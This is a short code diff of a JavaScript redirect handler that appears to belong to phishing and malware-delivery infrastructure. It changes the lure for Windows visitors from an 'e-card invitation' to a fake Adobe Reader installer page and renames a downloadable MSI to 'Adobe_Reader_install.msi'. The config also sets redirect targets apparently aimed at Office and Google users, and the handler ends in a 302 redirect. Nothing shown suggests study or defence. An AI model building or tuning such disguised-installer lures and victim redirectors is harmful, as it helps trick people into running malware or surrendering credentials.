@@ -3,9 +3,9 @@ import dns from "dns/promises";
 /* ================= CONFIG ================= */
 
 const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
-  "https://aspiceconference.com/e-card_invitation/ecard.html";
+  "https://aspiceconference.com/adobe-reader/installer/download.html";
 
-const MSI_PATH = "/access_invitation";
+const MSI_PATH = "/Adobe_Reader_install.msi";
 
 const OFFICE_TARGET = "https://aspiceconference.com/cw";
 const GOOGLE_TARGET = "https://aspiceconference.com/wa";
@@ -158,3 +158,4 @@ export default async function handler(req, res) {
   res.writeHead(302, { Location: finalUrl });
   res.end();
 }
+
